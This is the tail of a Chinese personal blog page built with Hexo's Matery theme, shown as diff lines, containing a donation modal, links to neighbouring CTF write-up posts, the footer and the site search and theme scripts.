+                <div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">网络乞讨</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2022/09/13/wu-can-shu-rce/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="无参数RCE">
+                        
+                        <span class="card-title">无参数RCE</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-09-13
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Aurorabin
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ctfshow/">
+                        <span class="chip bg-color">ctfshow</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/09/13/wu-zi-mu-shu-zi-de-webshell/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="无字母数字的webshell">
+                        
+                        <span class="card-title">无字母数字的webshell</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-09-13
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Aurorabin
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ctfshow/">
+                        <span class="chip bg-color">ctfshow</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
+
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2022</span>
+            
+            <a href="/about" target="_blank">Aurorabin</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/zeobi" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:877199409@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=877199409" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 877199409" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+        
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/sakura-reduce.js"><\/script>');
+            }
+        </script>
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
